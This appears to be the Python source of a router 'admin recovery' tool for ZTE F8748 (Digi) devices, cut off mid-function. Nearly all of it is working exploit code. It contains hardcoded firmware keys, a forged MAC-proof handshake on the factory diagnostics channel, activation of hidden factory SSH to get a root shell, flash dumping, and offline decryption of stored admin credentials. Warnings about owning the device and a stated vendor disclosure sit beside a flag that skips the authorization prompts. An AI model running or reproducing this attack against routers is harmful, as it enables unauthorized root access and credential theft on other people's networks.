#!/usr/bin/env python3
"""
DIGI F8748 Admin Recovery — el recuperador de la contraseña de administrador
para routers ZTE F8748 (Digi). Si estás aquí, es que la has perdido.

Autor: github.com/686f6c61

Recupera el login del administrador web paso a paso, de forma segura,
sin instalar nada y sin tocar tu configuración.

Implementation notes
  * Written from scratch against the reverse-engineered protocol of the
    router firmware (webFac handshake, flash layout, offline crypto).
    No code from any third-party tool.
  * Protocol constants (KEY_POOL, toy-RSA params, paramtag key) are
    firmware secrets of the ZTE F8748, not creative code.
  * Use ONLY on a router you own or are authorized to manage.
  * Nothing gets installed — not on the router (no firmware, software or
    configuration changes; the existing factory diagnostic mode is switched
    on temporarily and switched back off at the end) and not on your
    computer (nothing persistent, temp files wiped on exit). The tool only
    leverages the manufacturer's own design so the router reveals the admin
    credentials it already stores inside.
  * Find responsibly disclosed to ZTE PSIRT by email (2026-09-22).

Usage examples
  ./digi-f8748.py info
  ./digi-f8748.py handshake                 # dry: computes proof, sends nothing
  ./digi-f8748.py arm                       # activates factory SSH, prints creds
  ./digi-f8748.py dump --out ./dump         # pulls seed/oss/paramtag/boardtype
  ./digi-f8748.py decrypt --dir ./dump      # offline: prints admin credentials
  ./digi-f8748.py verify -U admin -W '...'  # tests web login (curRight=1)
  ./digi-f8748.py disarm                    # closes factory SSH
  ./digi-f8748.py recover                   # all of the above in sequence
"""
from __future__ import annotations

import argparse
import hashlib
import json
import os
import re
import socket
import struct
import subprocess
import sys
import time
import zlib
import xml.etree.ElementTree as ET
from pathlib import Path

try:
    import requests
except ImportError:
    sys.exit("Missing dependency 'requests'. Run: pip install requests paramiko pycryptodome")
try:
    import paramiko
except ImportError:
    sys.exit("Missing dependency 'paramiko'. Run: pip install requests paramiko pycryptodome")
try:
    from Crypto.Cipher import AES
except ImportError:
    sys.exit("Missing dependency 'pycryptodome'. Run: pip install requests paramiko pycryptodome")

TOOL = "digi-f8748"
VERSION = "0.0.2"
MAX_XML_BYTES = 262144

# --------------------------------------------------------------------------
# ZTE F8748 firmware protocol constants
# --------------------------------------------------------------------------
ALPHABET = "lmaoztebcdfghijknpqrsuvwxy"
RSA_E = 5767
RSA_N = 30049                      # toy RSA: pow(x, 5767, 30049)
FNV_PRIME = 16777619               # index mixer (FNV-32 prime)
INDEX_MASK = 2147483711
KEY_POOL = bytes.fromhex(
    "9c3375d11c424537184891731745794443d7d573335476d2c5f12c4f7aba61d9"
    "5c69df8cd21cde3b352d2fe1de4c77f51a65d1fe18438ea742080478d5e4f33"
    "4a4d3f236476d869d42651342dc429948dc679f9edc46375f849f6f76ce794f49"
)
DEFAULT_WEB_USER = "user"
DEFAULT_WEB_PASS = "user"
DEFAULT_VID = "108"                # fallback board vid if boardtype read fails

HARDCODE_MAGIC = b"\x01\x02\x03\x04"
ZTE_DATA_MARKER = b"\x85\x19\x02\xe0"
PARAMTAG_KEYHEX = "8cc72b05705d5c46f412af8cbed55aad"
PARAMTAG_PREFIX = "zx279132"
TAG_USERNAME = 0x602
TAG_PASSWORD = 0x702
HC_USER_KEY = "SSH_UserName_2009"
HC_PASS_KEY = "SSH_PassWord_2009"

# Flash windows scanned for the hardcode seed + oss container (offset, size)
DUMP_DEVICES = ["/dev/mtd9", "/dev/mtd8", "/dev/mtd10", "/dev/mtd7"]
DUMP_WINDOWS = [
    (0x980000, 0x40000), (0x9C0000, 0x40000), (0xA00000, 0x40000),
    (0xA40000, 0x40000), (0xA80000, 0x40000), (0x900000, 0x40000),
    (0x940000, 0x40000), (0xAC0000, 0x40000), (0xB00000, 0x40000),
    (0x800000, 0x40000), (0x880000, 0x40000),
]
DUMP_CHUNKS = [8192, 4096, 2048]

HEXDIGITS = "0123456789abcdefABCDEF"
HOST_RE = re.compile(r"^[A-Za-z0-9.\-]{1,253}$")


def log(msg: str) -> None:
    print(msg, flush=True)


def die(msg: str) -> None:
    sys.exit(f"[x] {msg}")


def validate_host(host: str) -> str:
    """Only a bare IP/hostname may reach the URL builder — no path, scheme or
    credentials smuggling. This tool talks to the operator's own LAN router."""
    if not HOST_RE.match(host or ""):
        die(f"invalid router host {host!r} (expected an IP or hostname, nothing else)")
    return host


def http_get(session_or_none, url: str, timeout: float, **kw):
    kw.setdefault("allow_redirects", False)
    getter = session_or_none.get if session_or_none is not None else requests.get
    return getter(url, timeout=timeout, headers={"User-Agent": "Mozilla/5.0"}, **kw)


def http_post(session_or_none, url: str, timeout: float, **kw):
    kw.setdefault("allow_redirects", False)
    sender = session_or_none.post if session_or_none is not None else requests.post
    return sender(url, timeout=timeout, headers={"User-Agent": "Mozilla/5.0"}, **kw)


def parse_router_xml(xml_bytes: bytes) -> ET.Element:
    """Parse a small XML answer from the router, refusing DTD entities."""
    if len(xml_bytes) > MAX_XML_BYTES:
        raise ValueError("router XML response too large")
    head = xml_bytes[:4096].lstrip().lower()
    if b"<!doctype" in head or b"<!entity" in head:
        raise ValueError("router XML response contains DTD declarations")
    return ET.fromstring(xml_bytes)


# --------------------------------------------------------------------------
# MAC / LAN helpers
# --------------------------------------------------------------------------
def parse_mac(s: str) -> bytes:
    raw = bytes.fromhex(s.replace(":", "").replace("-", ""))
    if len(raw) != 6:
        raise ValueError(f"invalid mac: {s}")
    return raw


def local_ip_for(host: str) -> str:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.settimeout(2.0)
        s.connect((host, 80))
        return s.getsockname()[0]
    except OSError:
        return ""
    finally:
        s.close()


MAC_PLACEHOLDERS = {"02:00:00:00:00:00", "00:00:00:00:00:00"}


def local_mac_for(host: str) -> str:
    ip = local_ip_for(host)
    if not ip:
        return ""
    try:
        out = subprocess.run(["ifconfig"], capture_output=True, text=True, timeout=5).stdout
        for block in re.split(r"\n(?=\w)", out):
            if f"inet {ip} " in block:
                m = re.search(r"ether ([0-9a-f:]{17})", block)
                if m and m.group(1) not in MAC_PLACEHOLDERS:
                    return m.group(1)
    except Exception:
        pass
    if sys.platform.startswith("linux"):
        try:
            out = subprocess.run(["ip", "-4", "addr", "show"], capture_output=True, text=True, timeout=5).stdout
            for block in re.split(r"\n(?=\d+:)", out):
                if f"inet {ip} " in block:
                    m = re.search(r"link/ether ([0-9a-f:]{17})", block)
                    if m and m.group(1) not in MAC_PLACEHOLDERS:
                        return m.group(1)
        except Exception:
            pass
    return ""


def arp_mac_for(host: str) -> str:
    # populate/refresh the ARP cache first; a cold cache yields "(incomplete)"
    ping_flags = (["-c", "1", "-W", "1"] if sys.platform.startswith("linux")
                  else ["-c", "1", "-t", "1"])
    subprocess.run(["ping"] + ping_flags + [host], capture_output=True, timeout=5)
    if sys.platform.startswith("linux"):
        try:
            out = subprocess.run(["ip", "neigh", "show"], capture_output=True, text=True, timeout=5).stdout
            for line in out.splitlines():
                f = line.split()
                if len(f) >= 5 and f[0] == host and ":" in f[4]:
                    return f[4].lower()
        except Exception:
            pass
        try:
            for line in open("/proc/net/arp").read().splitlines()[1:]:
                f = line.split()
                if len(f) >= 6 and f[0] == host and f[2] != "0x0":
                    return f[3].lower()
        except Exception:
            pass
        return ""
    try:
        out = subprocess.run(["arp", "-n", host], capture_output=True, text=True, timeout=5).stdout
    except Exception:
        return ""
    m = re.search(r"\(([0-9.]+)\) at ([0-9a-f:]{17})", out)
    mac = m.group(2) if m else ""
    return "" if mac in MAC_PLACEHOLDERS else mac


# --------------------------------------------------------------------------
# MAC proof payload (alphabet-constrained toy-RSA encoding)
# --------------------------------------------------------------------------
def _alphabet_ints(alphabet: str, length: int):
    ab = alphabet.encode("utf-8")
    import itertools
    for combo in itertools.product(ab, repeat=length):
        yield int.from_bytes(bytes(combo), "little")


def evaluate_alphabet(alphabet: str, exponent: int, modulus: int, value_map=lambda x: x) -> dict:
    wanted = set()
    for i in range(modulus):
        wanted.add(value_map(pow(i, exponent, modulus)))
    found: dict = {}
    for num in _alphabet_ints(alphabet, 4):
        res = value_map(pow(num, exponent, modulus))
        if res not in found:
            found[res] = num
            if len(found) == len(wanted):
                return found
    raise RuntimeError(f"alphabet search incomplete: {len(found)}/{len(wanted)}")


_MAPS = None


def encoding_maps():
    global _MAPS
    if _MAPS is None:
        t0 = time.time()
        log("[*] Building alphabet encoding maps (one-time, ~seconds)…")
        header = evaluate_alphabet(ALPHABET, RSA_E, RSA_N)
        mac = evaluate_alphabet(ALPHABET, 1, RSA_E, lambda x: x & 255)
        _MAPS = (header, mac)
        log(f"[+] Maps ready in {time.time() - t0:.1f}s")
    return _MAPS


def create_payload(br0_mac: bytes, client_mac: bytes) -> list:
    header, mac = encoding_maps()
    payload = [header[0], header[1], header[0], header[RSA_E]]
    payload.extend(map(mac.__getitem__, br0_mac + client_mac + client_mac))
    return payload


def info_message(arr: list) -> bytes:
    words = b"".join(x.to_bytes(4, "little") for x in arr)
    return b"SendInfo.gch?info=%d|%s" % (len(arr), words)


# --------------------------------------------------------------------------
# webFac session (the router's factory diagnostics channel)
# --------------------------------------------------------------------------
def pad16(data: bytes) -> bytes:
    return data + b"\x00" * (16 - len(data) % 16)


class WebFac:
    def __init__(self, host: str, web_user: str, web_pass: str, client_rand: int = 0):
        self.host = validate_host(host)
        self.base = f"http://{host}"
        self.web_user = web_user
        self.web_pass = web_pass
        self.client_rand = client_rand
        self.s = requests.Session()
        self.s.headers["User-Agent"] = "Mozilla/5.0"
        self.aes = None
        self.server_rand = None

    def handshake(self) -> dict:
        """Wake the webFac service, collect the challenge, derive session key."""
        self.s.post(f"{self.base}/webFac", data="SendSq.gch", timeout=8)
        try:
            self.s.post(f"{self.base}/webFac", data="RequestFactoryMode.gch", timeout=8)
        except requests.exceptions.ConnectionError:
            pass
        r = self.s.post(
            f"{self.base}/webFac",
            data=f"SendSq.gch?rand={self.client_rand}\r\n",
            timeout=8,
        )
        m = re.match(rb"re_rand=([^&]+)&([^&]+)&(.{6})", r.content, re.S)
        if not m:
            raise RuntimeError(f"webFac gave no re_rand (HTTP {r.status_code})")
        self.server_rand = int(m.group(1))
        index = ((FNV_PRIME * self.client_rand) & INDEX_MASK ^ self.server_rand) % 60
        key = KEY_POOL[index : index + 24]
        self.aes = AES.new(key, AES.MODE_ECB)
        return {"server_rand": self.server_rand, "key_index": index,
                "key_hex": key.hex(), "status": r.status_code}

    def send(self, plaintext: bytes) -> bytes:
        """Send one AES-ECB-encrypted command over /webFacEntry."""
        if self.aes is None:
            raise RuntimeError("handshake() must run first")
        r = self.s.post(f"{self.base}/webFacEntry", data=self.aes.encrypt(pad16(plaintext)),
                        timeout=10, allow_redirects=False)
        return r.content

    def mac_proof(self, br0_mac: bytes, client_mac: bytes) -> bytes:
        return self.send(info_message(create_payload(br0_mac, client_mac)))

    def login(self) -> None:
        self.send(f"CheckLoginAuth.gch?version50&user={self.web_user}&pass={self.web_pass}".encode())

    def factory_mode(self, mode: int, settle_s: float = 2.0) -> tuple[str, str]:
        """mode=2 arms the factory Dropbear, mode=0 disarms it."""
        raw = self.send(f"FactoryMode.gch?mode={mode}&user=notused".encode())
        dec = self.aes.decrypt(raw if len(raw) % 16 == 0 else pad16(raw))
        um = re.search(rb"user=([^&]+)&pass=([^\x00&]+)", dec)
        if not um:
            if mode == 0:
                time.sleep(settle_s)
                return ("", "")
            raise RuntimeError("FactoryMode returned no credentials (MAC proof failed?)")
        user = um.group(1).decode("latin1")
        pw = um.group(2).decode("latin1")
        time.sleep(settle_s)
        return (user, pw)


# --------------------------------------------------------------------------
# SSH stage
# --------------------------------------------------------------------------
def ssh_connect(host: str, user: str, pw: str, timeout: float = 15.0):
    t = paramiko.Transport((validate_host(host), 22))
    t.banner_timeout = timeout
    t.auth_timeout = timeout
    t.start_client()
    t.auth_password(user, pw)
    return t


def open_root_shell(host: str, user: str, pw: str, attempts: int = 5, timeout: float = 15.0):
    last = "not attempted"
    for i in range(1, attempts + 1):
        try:
            t = ssh_connect(host, user, pw, timeout)
            ch = t.open_session()
            ch.get_pty(term="vt100", width=80, height=24)
            ch.invoke_shell()
            time.sleep(0.8)
            out = shell_read(ch, "cat /proc/self/status", 2.5)
            if not re.search(r"Uid:\s+0\s+0\s+0\s+0", out):
                t.close()
                raise RuntimeError("shell did not report UID 0")
            log(f"[+] root shell confirmed (attempt {i})")
            return t, ch
        except Exception as e:
            last = f"{type(e).__name__}: {e}"
            log(f"[!] shell open attempt {i}/{attempts} failed: {last}")
            time.sleep(2.0)
    raise RuntimeError(f"could not open factory shell ({last})")


def shell_read(chan, cmd: str, wait: float = 1.0) -> str:
    """Send one command on the interactive shell and drain until idle."""
    while chan.recv_ready():
        chan.recv(65536)
        time.sleep(0.04)
    chan.send(cmd + "\n")
    time.sleep(max(0.08, wait / 10))
    deadline = time.time() + wait
    buf = b""
    last = time.time()
    while time.time() < deadline:
        if chan.recv_ready():
            buf += chan.recv(65536)
            last = time.time()
        elif time.time() - last > 0.9:
            break
        else:
            time.sleep(0.04)
    return buf.decode("latin1", "replace")


def hex_from_shell(text: str) -> bytes:
    """Parse `hexdump -ve '1/1 "%02x"'` output; strip echo / prompts."""
    lines = []
    for ln in text.splitlines():
        s = ln.strip()
        if not s or s.startswith("/ #") or s == "/ #":
            continue
        if "hexdump" in s or "mtd_" in s or "Access Denied" in s:
            continue
        lines.append(re.sub(r"^/ #\s*", "", s))
    flat = re.sub("[^0-9a-fA-F]", "", "".join(lines))
    if len(flat) % 2:
        flat = flat[:-1]
    if len(flat) < 2:
        return b""
    try:
        return bytes.fromhex(flat)
    except ValueError:
        return b""


def mtd_pull(chan, dev: str, offset: int, size: int, chunk: int, tmp: str = "/var/tmp/digi.bin") -> bytes:
    data = bytearray()
    n = (size + chunk - 1) // chunk
    for i in range(n):
        off = offset + i * chunk
        sz = min(chunk, size - i * chunk)
        meta = shell_read(chan, f"mtd_debug read {dev} {off} {sz} {tmp}", 12)
        if "Copied" not in meta:
            time.sleep(0.3)
            meta = shell_read(chan, f"mtd_debug read {dev} {off} {sz} {tmp}", 14)
        if "Copied" not in meta:
            log(f"    [!] mtd_debug failed @ {off:#x}: {meta.strip()[:80]!r}")
            continue
        text = shell_read(chan, "hexdump -ve '1/1 \"%02x\"' " + tmp, 40)
        part = hex_from_shell(text)
        if len(part) != sz:
            text = shell_read(chan, "hexdump -ve '1/1 \"%02x\"' " + tmp, 50)
            part = hex_from_shell(text)
        if part:
            data += part
            if (i + 1) % 16 == 0 or i + 1 == n:
                log(f"    [*] {dev} @ {off:#x}: {len(data)}/{size} bytes")
    return bytes(data)


def find_seed_line(blob: bytes) -> bytes | None:
    for m in re.finditer(rb"([0-9a-fA-F]{48,120}v\d+\.\d+)", blob):
        return m.group(1) + b"\n"
    for m in re.finditer(rb"([\x20-\x7e]{64,160}v\d+\.\d+)", blob):
        s = m.group(1)
        if len(s) >= 64:
            return s + b"\n"
    return None


def extract_named(blob: bytes, name: bytes) -> bytes | None:
    """Extract the zlib-wrapped hardcode payload after a ZTE DATA record near `name`."""
    start = 0
    while True:
        j = blob.find(name, start)
        if j < 0:
            return None
        area = blob[j : j + 16384]
        di = area.find(ZTE_DATA_MARKER)
        if di < 0:
            area = blob[max(0, j - 32) : j + 16384]
            di = area.find(ZTE_DATA_MARKER)
        if di >= 0:
            rec = area[di:]
            for zi in range(0, min(300, len(rec) - 2)):
                if rec[zi] == 0x78 and rec[zi + 1] in (1, 0x5E, 0x9C, 0xDA):
                    for end in (2048, 4096, 8192, 16384, len(rec)):
                        try:
                            plain = zlib.decompress(rec[zi:end])
                        except Exception:
                            continue
                        if plain.startswith(HARDCODE_MAGIC):
                            return plain
        start = j + 1


def dump_router(host: str, ssh_user: str, ssh_pass: str, out_dir: Path) -> dict:
    out_dir.mkdir(parents=True, exist_ok=True)
    t, ch = open_root_shell(host, ssh_user, ssh_pass)
    results = {}
    try:
        # board vid
        bt = shell_read(ch, "cat /proc/capability/boardtype", 2.5)
        (out_dir / "boardtype.txt").write_text(bt)
        m = re.search(r"vid\s*:\s*(\d+)", bt)
        results["vid"] = m.group(1) if m else ""
        log(f"[+] vid: {results['vid'] or '(not found — decrypt will fall back)'}")

        # paramtag (direct file first, then mtd probes)
        pt = b""
        for wait in (50.0, 70.0):
            text = shell_read(ch, "hexdump -ve '1/1 \"%02x\"' /tagparam/paramtag", wait)
            pt = hex_from_shell(text)
            if pt.startswith(b"TAGH") and len(pt) >= 64:
                log(f"[+] paramtag: {len(pt)} bytes via /tagparam/paramtag")
                break
        if not (pt.startswith(b"TAGH") and len(pt) >= 64):
            found_pt = False
            for dev in ("/dev/mtd1", "/dev/mtd2", "/dev/mtd3", "/dev/mtd4", "/dev/mtd5"):
                if found_pt:
                    break
                for size in (2048, 4096, 8192, 16384):
                    meta = shell_read(ch, f"mtd_debug read {dev} 0 {size} /var/tmp/digi_pt.bin", 12)
                    if "Copied" not in meta:
                        continue
                    text = shell_read(ch, "hexdump -ve '1/1 \"%02x\"' /var/tmp/digi_pt.bin", 40)
                    cand = hex_from_shell(text)
                    if cand.startswith(b"TAGH") and len(cand) >= 64:
                        pt = cand
                        log(f"[+] paramtag: {len(pt)} bytes via {dev}")
                        found_pt = True
                        break
                    idx = cand.find(b"TAGH")
                    if idx >= 0 and len(cand) - idx >= 64:
                        pt = cand[idx:]
                        log(f"[+] paramtag: {len(pt)} bytes via {dev} (offset {idx})")
                        found_pt = True
                        break
        if pt:
            (out_dir / "paramtag.bin").write_bytes(pt)
            results["paramtag"] = out_dir / "paramtag.bin"

        # hardcode seed + oss container from flash windows
        seed = None
        oss = None
        for dev in DUMP_DEVICES:
            probe = shell_read(ch, f"mtd_debug read {dev} 0 16 /var/tmp/digi_p.bin", 8)
            if "Copied" not in probe:
                log(f"[*] skipping {dev} (not readable)")
                continue
            log(f"[*] scanning flash windows on {dev}…")
            for chunk in DUMP_CHUNKS:
                seed = None
                oss = None
                for off, size in DUMP_WINDOWS:
                    log(f"    [*] window @ {off:#x} chunk={chunk}")
                    part = mtd_pull(ch, dev, off, size, chunk)
                    # keep a rolling window so cross-boundary records survive
                    flash = getattr(dump_router, "_flash", None)
                    flash = flash + part if flash else part
                    if len(flash) > 4_000_000:
                        flash = flash[-2_000_000:]
                    dump_router._flash = flash
                    if seed is None:
                        seed = find_seed_line(flash)
                    if oss is None:
                        cand = extract_named(flash, b"oss")
                        if cand is not None and cand.startswith(HARDCODE_MAGIC):
                            oss = cand
                    if seed and oss:
                        break
                if seed and oss:
                    break
            if seed and oss:
                break
        dump_router._flash = None
        if seed:
            (out_dir / "hardcode.seed").write_bytes(seed)
            results["seed"] = out_dir / "hardcode.seed"
            log("[+] /etc/hardcode seed located")
        if oss:
            (out_dir / "oss.bin").write_bytes(oss)
            results["oss"] = out_dir / "oss.bin"
            log(f"[+] oss hardcode container located ({len(oss)} bytes)")
        return results
    finally:
        dump_router._flash = None
        try:
            shell_read(ch, "rm -f /var/tmp/digi*.bin", 2)
            t.close()
        except Exception:
            pass


# --------------------------------------------------------------------------
# Offline crypto (ZTE hardcode + paramtag)
# --------------------------------------------------------------------------
def normalize_seed_line(data) -> str:
    text = data.decode("latin1", "replace") if isinstance(data, bytes) else data
    text = text.strip("\r\n\x00")
    if len(text) >= 64 and all(c in HEXDIGITS for c in text[:16]):
        return text
    for i, ch in enumerate(text):
        if ch in HEXDIGITS:
            cand = text[:i].split("\n")[0].strip("\r\x00")
            if len(cand) >= 64:
                return cand
    return text.split("\n")[0].strip("\r\x00")


def derive_hardcode_aes(seed_line) -> tuple[bytes, bytes]:
    line = normalize_seed_line(seed_line)
    if len(line) < 64:
        raise ValueError(f"hardcode seed line too short: {len(line)}")
    key_part = bytearray()
    iv_part = bytearray()
    for i in range(64):
        ch = ord(line[i])
        if 47 <= i <= 62:
            key_part.append((ch + 2) & 255)
        if 2 <= i <= 33:
            iv_part.append((ch + 3) & 255)
    suffix = line[64:]
    keystr = (bytes(key_part).decode("latin1") + suffix)[:32]
    ivstr = bytes(iv_part).decode("latin1")
    key = hashlib.sha256(keystr.encode("latin1")).digest()
    iv = hashlib.sha256(ivstr.encode("latin1")).digest()[:16]
    return key, iv


def _pkcs_unpad(pt: bytes) -> bytes:
    if pt and 1 <= pt[-1] <= 16 and pt.endswith(bytes([pt[-1]]) * pt[-1]):
        return pt[:-pt[-1]]
    return pt


def decrypt_hardcode_container(blob: bytes, seed_line) -> bytes:
    if len(blob) < 88:
        raise ValueError("hardcode container too small")
    if blob[:4] != HARDCODE_MAGIC:
        raise ValueError(f"bad hardcode magic: {blob[:4]!r}")
    struct.unpack_from(">I", blob, 4)  # container type (3/5/6 on this family)
    plain_len = struct.unpack_from(">I", blob, 60)[0]
    cipher_len = struct.unpack_from(">I", blob, 64)[0]
    if cipher_len == 0 or cipher_len > len(blob) - 72:
        raise ValueError(f"bad cipher_len={cipher_len}")
    key, iv = derive_hardcode_aes(seed_line)
    ct = blob[72 : 72 + cipher_len]
    ct = ct[: len(ct) // 16 * 16]
    pt = AES.new(key, AES.MODE_CBC, iv).decrypt(ct)
    pt = _pkcs_unpad(pt)
    if plain_len and plain_len <= len(pt):
        pt = pt[:plain_len]
    return pt


def parse_kv_catalog(pt: bytes) -> dict:
    catalog = {}
    for line in pt.decode("utf-8", "replace").replace("\r\n", "\n").split("\n"):
        line = line.strip()
        if "=" in line:
            k, _, v = line.partition("=")
            catalog[k.strip()] = v.strip()
    return catalog


def derive_paramtag_aes(vid: str) -> tuple[bytes, bytes, bytes]:
    material = f"{PARAMTAG_PREFIX}{vid}{PARAMTAG_KEYHEX}"[:32].encode("ascii")
    dig = hashlib.sha256(material).digest()
    return dig[:16], dig[16:], material


def _paramtag_decrypt(data: bytes, key: bytes, iv: bytes) -> bytes | None:
    ct = data[: len(data) // 16 * 16]
    if len(ct) < 16:
        return None
    pt = AES.new(key, AES.MODE_CBC, iv).decrypt(ct)
    if pt and 1 <= pt[-1] <= 16 and pt.endswith(bytes([pt[-1]]) * pt[-1]):
        pt = pt[: -pt[-1]]
    if b"\x00" in pt:
        pt = pt[: pt.find(b"\x00")]
    hs = []
    for b in pt:
        ch = chr(b)
        if ch in HEXDIGITS:
            hs.append(ch)
        else:
            break
    hs_s = "".join(hs)
    if len(hs_s) >= 2:
        try:
            return bytes.fromhex(hs_s[: len(hs_s) // 2 * 2])
        except ValueError:
            pass
    return pt


def parse_paramtag(blob: bytes, vid: str) -> list:
    key, iv, _ = derive_paramtag_aes(vid)
    out = []
    pos = 20
    while pos + 10 <= len(blob):
        pid = struct.unpack_from("<H", blob, pos)[0]
        ln = struct.unpack_from("<H", blob, pos + 4)[0]
        f6 = struct.unpack_from("<H", blob, pos + 6)[0]
        f8 = struct.unpack_from("<H", blob, pos + 8)[0]
        if ln < 0 or ln > 4096:
            break
        npos = (pos + ln + 9) & ~3
        rec = {"id": pid, "id_hex": hex(pid), "pos": hex(pos), "length": ln,
               "enc": (f6 == 0 and f8 == 1)}
        if rec["enc"]:
            raw = _paramtag_decrypt(blob[pos + 10 : npos], key, iv)
            if raw is not None:
                try:
                    rec["value"] = raw.decode("utf-8")
                    rec["encoding"] = "utf8"
                except UnicodeDecodeError:
                    rec["value"] = raw.hex()
                    rec["encoding"] = "hex"
                rec["len"] = len(raw)
        out.append(rec)
        pos = npos
    return out


def map_admin_credentials(seed_path: Path, oss_path: Path, paramtag_path: Path, vid: str) -> dict:
    seed = normalize_seed_line(seed_path.read_bytes())
    oss = parse_kv_catalog(decrypt_hardcode_container(oss_path.read_bytes(), seed))
    rows = parse_paramtag(paramtag_path.read_bytes(), vid)
    by_id = {r["id"]: r for r in rows}
    tag_user = by_id.get(TAG_USERNAME, {})
    tag_pass = by_id.get(TAG_PASSWORD, {})
    username = tag_user.get("value") or oss.get(HC_USER_KEY)
    password = tag_pass.get("value") or oss.get(HC_PASS_KEY)
    if not username or not password:
        raise RuntimeError(
            f"incomplete credentials: user={bool(username)} pass={bool(password)} "
            f"tag0x602={TAG_USERNAME in by_id} tag0x702={TAG_PASSWORD in by_id} "
            f"oss_user={HC_USER_KEY in oss} oss_pass={HC_PASS_KEY in oss}"
        )
    return {
        "username": username,
        "password": password,
        "user_source": f"paramtag:{hex(TAG_USERNAME)}" if tag_user.get("value") else f"hardcode:{HC_USER_KEY}",
        "pass_source": f"paramtag:{hex(TAG_PASSWORD)}" if tag_pass.get("value") else f"hardcode:{HC_PASS_KEY}",
        "vid": vid,
        "oss_keys": sorted(oss.keys()),
        "paramtag_ids": sorted({r["id"] for r in rows}),
    }


# --------------------------------------------------------------------------
# Web login verification + router info
# --------------------------------------------------------------------------
def verify_web_admin(host: str, username: str, password: str, timeout: float = 15.0) -> dict:
    validate_host(host)
    base = f"http://{host}"
    s = requests.Session()
    s.headers["User-Agent"] = "Mozilla/5.0"
    http_get(s, base + "/", timeout)
    r = http_get(s, base + "/?_type=loginData&_tag=login_entry", timeout)
    j = r.json()
    token = j.get("sess_token")
    if j.get("lockingTime") and int(j.get("lockingTime") or 0) > 0:
        return {"ok": False, "error": "login_locked", "lockingTime": j.get("lockingTime")}
    xml_bytes = http_get(s, base + "/?_type=loginData&_tag=login_token", timeout).content
    root = parse_router_xml(xml_bytes)
    salt = (root.text or "").strip()
    if not salt:
        for el in root.iter():
            if el.text and el.text.strip():
                salt = el.text.strip()
                break
    if not salt:
        return {"ok": False, "error": "no_login_token"}
    pw_hash = hashlib.sha256((password + salt).encode("utf-8")).hexdigest()
    r = http_post(s, base + "/?_type=loginData&_tag=login_entry", timeout,
                  data={"action": "login", "Username": username, "Password": pw_hash,
                        "_sessionTOKEN": token or ""})
    try:
        body = r.json()
    except Exception:
        return {"ok": False, "error": "bad_login_response"}
    if body.get("loginErrMsg"):
        return {"ok": False, "error": "login_rejected", "loginErrMsg": body.get("loginErrMsg")}
    html = http_get(s, base + "/", timeout).text
    m = re.search(r'curRight\s*=\s*"(\d+)"', html)
    cur = m.group(1) if m else None
    return {"ok": cur == "1", "curRight": cur, "html_len": len(html)}


def router_info(host: str, timeout: float = 8.0) -> dict:
    """Best-effort model/firmware scrape from the router's own web pages."""
    validate_host(host)
    base = f"http://{host}"
    info = {"host": host}
    try:
        import html as _html
        html = _html.unescape(http_get(None, base + "/", timeout).text)
        models = sorted(set(re.findall(r"F\d{4}[A-Z]?", html)))
        versions = sorted(set(re.findall(r"\bV\d+\.\d+(?:\.\d+)*[A-Za-z]?\b", html[:20000])))[:8]
        if models:
            info["models"] = models
        if versions:
            info["version_candidates"] = versions
        tm = re.search(r"<title>(.*?)</title>", html, re.S | re.I)
        if tm:
            info["title"] = _html.unescape(tm.group(1)).strip()[:120]
    except Exception as e:
        info["error"] = f"{type(e).__name__}: {e}"
    try:
        r = http_get(None, base + "/?_type=loginData&_tag=login_entry", timeout)
        j = r.json()
        keep = {k: j[k] for k in ("sessionId", "fosAddr", "modelName", "hardwareVersion",
                                  "softwareVersion", "OriginContentType", "language") if k in j}
        if keep:
            info["login_entry"] = keep
    except Exception:
        pass
    return info


# --------------------------------------------------------------------------
# CLI steps
# --------------------------------------------------------------------------
def common_args(p: argparse.ArgumentParser) -> None:
    p.add_argument("--host", default="192.168.1.1", help="router IP (default 192.168.1.1)")
    p.add_argument("--web-user", default=DEFAULT_WEB_USER, help="normal web login user")
    p.add_argument("--web-pass", default=DEFAULT_WEB_PASS, help="normal web login password")
    p.add_argument("--client-rand", type=int, default=0, help="webFac client rand (default 0)")
    p.add_argument("-y", "--yes", action="store_true", dest="yes",
                   help="no pedir confirmaciones de autorización")


def resolve_macs(args) -> tuple[bytes, bytes]:
    br0_hex = getattr(args, "router_mac", "") or arp_mac_for(args.host)
    cli_hex = getattr(args, "client_mac", "") or local_mac_for(args.host)
    if not br0_hex:
        die("Router MAC unknown — pass --router-mac aa:bb:cc:dd:ee:ff (sticker or status page)")
    if not cli_hex:
        die("Client MAC unknown — pass --client-mac aa:bb:cc:dd:ee:ff")
    log(f"[*] Router MAC (br0): {br0_hex}")
    log(f"[*] Client MAC:       {cli_hex}")
    return parse_mac(br0_hex), parse_mac(cli_hex)


def step_handshake(args, send_proof: bool = False) -> WebFac:
    br0, cli = resolve_macs(args)
    w = WebFac(args.host, args.web_user, args.web_pass, args.client_rand)
    hs = w.handshake()
    log(f"[+] handshake ok: server_rand={hs['server_rand']} key_index={hs['key_index']} key={hs['key_hex']}")
    arr = create_payload(br0, cli)
    msg = info_message(arr)
    log(f"[+] MAC proof ({len(arr)} words): {msg.decode()}")
    if send_proof:
        w.mac_proof(br0, cli)
        log("[+] MAC proof sent")
    else:
        log("[i] dry-run: proof NOT sent (use 'arm' or --send-proof to send)")
    return w


def cmd_info(args) -> None:
    log(f"== {TOOL} v{VERSION} — router info ==")
    info = router_info(args.host)
    log(json.dumps(info, indent=2, ensure_ascii=False))
    log(f"[*] your IP on this LAN : {local_ip_for(args.host) or '?'}")
    log(f"[*] your client MAC     : {local_mac_for(args.host) or '?'}")
    log(f"[*] router MAC (ARP)    : {arp_mac_for(args.host) or '?'}")
    log("[i] 'Router MAC' = sticker/ARP value above; 'Client MAC' = your MAC as the router lists it.")


def cmd_handshake(args) -> None:
    step_handshake(args, send_proof=getattr(args, "send_proof", False))
    log("[+] handshake complete")


def arm_with_retries(args, attempts: int = 3) -> tuple[WebFac, str, str]:
    br0, cli = resolve_macs(args)
    last = None
    for i in range(1, attempts + 1):
        try:
            log(f"[*] Factory SSH cycle {i}/{attempts}…")
            w = WebFac(args.host, args.web_user, args.web_pass, args.client_rand)
            w.handshake()
            try:
                w.factory_mode(0, 1.0)  # clean any stale state
            except Exception as e:
                log(f"[*] disarm note: {type(e).__name__}: {e}")
            time.sleep(1.2)
            w2 = WebFac(args.host, args.web_user, args.web_pass, args.client_rand)
            w2.handshake()
            w2.mac_proof(br0, cli)
            w2.login()
            fu, fp = w2.factory_mode(2, 2.2)
            if fu and fp:
                return w2, fu, fp
